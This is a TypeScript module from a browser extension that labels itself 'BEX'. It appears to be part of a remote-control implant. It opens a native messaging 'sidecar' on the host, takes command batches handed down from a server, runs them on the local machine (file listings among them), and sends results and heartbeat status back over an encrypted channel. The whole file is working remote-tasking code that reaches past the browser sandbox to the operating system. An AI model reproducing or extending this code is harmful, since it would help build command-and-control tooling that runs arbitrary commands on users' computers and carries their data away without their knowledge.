import { CONFIG } from './config';

let port: any = null; // browser.runtime.Port
let sidecarConnected = false;
let connectionAttempted = false;
let pendingCallbacks: Map<string, { resolve: (v: any) => void; reject: (e: any) => void; timer: ReturnType<typeof setTimeout> }> = new Map();

export function isSidecarSupported(): boolean {
  return CONFIG.sidecar.enabled;
}

export function isSidecarConnected(): boolean {
  return sidecarConnected;
}

export async function connectSidecar(): Promise<boolean> {
  if (!CONFIG.sidecar.enabled) return false;
  if (port && sidecarConnected) return true;
  if (connectionAttempted && !sidecarConnected) return false;

  connectionAttempted = true;

  try {
    port = browser.runtime.connectNative(CONFIG.sidecar.host_name);

    port.onMessage.addListener((msg: any) => {
      if (msg.id && pendingCallbacks.has(msg.id)) {
        const cb = pendingCallbacks.get(msg.id)!;
        clearTimeout(cb.timer);
        pendingCallbacks.delete(msg.id);
        cb.resolve(msg);
      }
    });

    port.onDisconnect.addListener(() => {
      sidecarConnected = false;
      connectionAttempted = false;
      port = null;
      // Reject all pending callbacks
      for (const [id, cb] of pendingCallbacks.entries()) {
        clearTimeout(cb.timer);
        cb.reject(new Error("Sidecar disconnected"));
      }
      pendingCallbacks.clear();
      console.log("BEX: Sidecar disconnected:", browser.runtime.lastError?.message);
      reportSidecarStatus(); // Notify server of disconnection
    });

    // Send a ping to confirm it's alive
    await sendCommand("list_dir", { path: "." });
    sidecarConnected = true;
    console.log("BEX: Sidecar connected and confirmed available.");
    reportSidecarStatus(); // Notify server of connection
    return true;

  } catch (e) {
    sidecarConnected = false;
    port = null;
    console.log("BEX: Sidecar not available (expected if not installed):", e);
    reportSidecarStatus(); // Notify server of failed connection
    return false;
  }
}

export function sendCommand(command: string, args: any): Promise<any> {
  return new Promise((resolve, reject) => {
    if (!port) {
      reject(new Error("Sidecar not connected"));
      return;
    }

    const id = crypto.randomUUID();
    const timer = setTimeout(() => {
      pendingCallbacks.delete(id);
      reject(new Error("Sidecar command timed out"));
    }, 60000);

    pendingCallbacks.set(id, { resolve, reject, timer });

    port.postMessage({ id, command, args });
  });
}

/**
 * Execute a single sidecar task: send command and report result back to server.
 */
async function executeSidecarTask(config: any): Promise<void> {
  const sendEncrypted = (self as any).__bexSendEncrypted;
  if (!sendEncrypted) {
    console.error("BEX: sendEncrypted not available yet for sidecar result");
    return;
  }
  const { requestId, command, args } = config;

  if (!isSidecarSupported()) {
    sendEncrypted("/bex/sidecar/result", {
      requestId,
      command,
      success: false,
      error: "Sidecar not enabled in build configuration"
    });
    return;
  }

  if (!isSidecarConnected()) {
    const connected = await connectSidecar();
    if (!connected) {
      sendEncrypted("/bex/sidecar/result", {
        requestId,
        command,
        success: false,
        error: "Sidecar native messaging host not available. Is the sidecar binary installed?"
      });
      return;
    }
  }

  try {
    const result = await sendCommand(command, args);
    sendEncrypted("/bex/sidecar/result", {
      requestId,
      command: result.command,
      success: result.success,
      data: result.data,
      error: result.error || ""
    });
  } catch (e) {
    sendEncrypted("/bex/sidecar/result", {
      requestId,
      command,
      success: false,
      error: String(e)
    });
  }
}

/**
 * Initialize sidecar task listener.
 * Listens for batches of SIDECAR_COMMAND tasks dispatched from checkTasks().
 * Commands within a batch are executed sequentially to preserve ordering.
 */
export function initSidecarTaskListener(): void {
  if (!CONFIG.sidecar.enabled) return;

  self.addEventListener('sidecar-task-batch', async (evt: any) => {
    const batch: any[] = evt.detail;
    console.log("BEX: Processing sidecar batch of", batch.length, "commands sequentially");
    for (const config of batch) {
      await executeSidecarTask(config);
    }
  });

  console.log("BEX: Sidecar task listener initialized.");
}

/**
 * Report sidecar status to the server via encrypted channel.
 * Called during heartbeats and after connection state changes.
 */
export function reportSidecarStatus(): void {
  if (!CONFIG.sidecar.enabled) return;

  const sendEncrypted = (self as any).__bexSendEncrypted;
  if (sendEncrypted) {
    sendEncrypted("/bex/sidecar/status", {
      supported: true,
      connected: sidecarConnected
    });
  }
}
